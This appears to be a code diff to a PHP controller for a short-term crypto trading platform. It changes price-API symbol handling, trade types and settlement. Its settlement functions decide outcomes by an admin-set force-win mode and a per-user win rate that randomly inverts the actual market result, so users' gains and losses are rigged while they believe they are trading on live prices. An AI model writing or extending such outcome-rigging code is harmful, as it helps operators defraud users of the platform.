@@ -35,7 +35,8 @@ class CryptoTradeController extends Controller
     {
         $general = Helper::config();
         $curl = curl_init();
-        $url = "https://min-api.cryptocompare.com/data/v2/histominute?fsym={$request->currency}&tsym=USD&limit=40&api_key=" . $general->crypto_api;
+        $apiCurrency = $this->resolveApiCurrencySymbol($request->currency);
+        $url = "https://min-api.cryptocompare.com/data/v2/histominute?fsym={$apiCurrency}&tsym=USD&limit=40&api_key=" . $general->crypto_api;
 
         curl_setopt_array($curl, array(
             CURLOPT_URL => $url,
@@ -97,7 +98,8 @@ class CryptoTradeController extends Controller
     public function currentPrice(Request $request)
     {
         $general = Helper::config();
-        $url = "https://min-api.cryptocompare.com/data/price?fsym={$request->currency}&tsyms=USD&api_key=" . $general->crypto_api;
+        $apiCurrency = $this->resolveApiCurrencySymbol($request->currency);
+        $url = "https://min-api.cryptocompare.com/data/price?fsym={$apiCurrency}&tsyms=USD&api_key=" . $general->crypto_api;
 
         try {
             $data = json_decode(file_get_contents($url), true);
@@ -140,11 +142,13 @@ class CryptoTradeController extends Controller
             'payload' => $request->only(['trade_cur', 'trade_price', 'trade_amount', 'type', 'duration']),
         ]);
 
+        $allowedTradeTypes = implode(',', Trade::allowedTradeTypes());
+
         $request->validate([
             "trade_cur" => "required",
             "trade_price" => "required",
             "trade_amount" => "required|numeric|gt:0",
-            "type" => "required|in:buy,sell",
+            "type" => "required|in:" . $allowedTradeTypes,
             "duration" => "required|in:0.5,1,1.5,2" // restrict values
         ]);
 
@@ -187,7 +191,7 @@ class CryptoTradeController extends Controller
             'currency' => $request->trade_cur,
             'current_price' => $request->trade_price,
             'trade_amount' => $request->trade_amount,
-            'trade_type' => $request->type,
+            'trade_type' => Trade::normalizeTradeType($request->type),
             'duration' => $durationInSeconds,
             'trade_stop_at' => now()->addSeconds($durationInSeconds),
             'trade_opens_at' => now()
@@ -271,7 +275,25 @@ class CryptoTradeController extends Controller
 
             $stake = (float) ($trade->trade_amount ?? 0);
             $profit = $this->resolveTradeProfit($trade, $stake);
-            $finalResult = $this->resolveTradeResult($trade);
+            $marketResult = $this->determineMarketResult(
+                $trade->trade_type,
+                (float) $trade->current_price,
+                (float) $currentPrice
+            );
+            $finalResult = $this->resolveTradeResult($trade, $marketResult);
+
+            if ($finalResult === null) {
+                $this->closeNeutralTrade($trade);
+
+                Log::info('Trade settled as neutral', [
+                    'trade_id' => $trade->id,
+                    'ref' => $trade->ref,
+                    'user_id' => $trade->user->id,
+                    'current_price' => $currentPrice,
+                ]);
+
+                continue;
+            }
 
             if ($finalResult) {
                 $charge = ($config->trade_charge / 100) * $profit;
@@ -351,7 +373,8 @@ class CryptoTradeController extends Controller
 
     private function fetchCurrentPrice(string $currency, string $apiKey): ?float
     {
-        $url = "https://min-api.cryptocompare.com/data/price?fsym={$currency}&tsyms=USD&api_key={$apiKey}";
+        $apiCurrency = $this->resolveApiCurrencySymbol($currency);
+        $url = "https://min-api.cryptocompare.com/data/price?fsym={$apiCurrency}&tsyms=USD&api_key={$apiKey}";
 
         try {
             $data = json_decode(file_get_contents($url), true);
@@ -384,11 +407,9 @@ class CryptoTradeController extends Controller
             return null;
         }
 
-        if ($tradeType === 'buy') {
-            return $closePrice > $openPrice;
-        }
-
-        return $closePrice < $openPrice;
+        return Trade::tradeDirectionFromType($tradeType) === 'up'
+            ? $closePrice > $openPrice
+            : $closePrice < $openPrice;
     }
 
     private function calculateTradeAmount(Trade $trade, float $closePrice): float
@@ -405,7 +426,7 @@ class CryptoTradeController extends Controller
         return $stake * $movePercent;
     }
 
-    private function resolveTradeResult(Trade $trade): bool
+    private function resolveTradeResult(Trade $trade, ?bool $marketResult): ?bool
     {
         if ($trade->result_mode === Trade::RESULT_MODE_FORCE_WIN) {
             return true;
@@ -417,7 +438,7 @@ class CryptoTradeController extends Controller
 
         $winRate = (int) ($trade->user->trade_win_rate ?? 50);
 
-        return rand(1, 100) <= $winRate;
+        return $this->applyBiasResult($marketResult, $winRate);
     }
 
     private function resolveTradeProfit(Trade $trade, float $stake): float
@@ -444,5 +465,20 @@ class CryptoTradeController extends Controller
         $shouldWin = random_int(1, 100) <= $winRate;
 
         return $shouldWin ? $marketResult : ! $marketResult;
+    }
+
+    private function resolveApiCurrencySymbol(?string $currency): string
+    {
+        $normalized = strtoupper((string) $currency);
+
+        if (str_contains($normalized, '_')) {
+            return explode('_', $normalized)[0];
+        }
+
+        if (str_contains($normalized, '/')) {
+            return explode('/', $normalized)[0];
+        }
+
+        return $normalized;
     }
 }
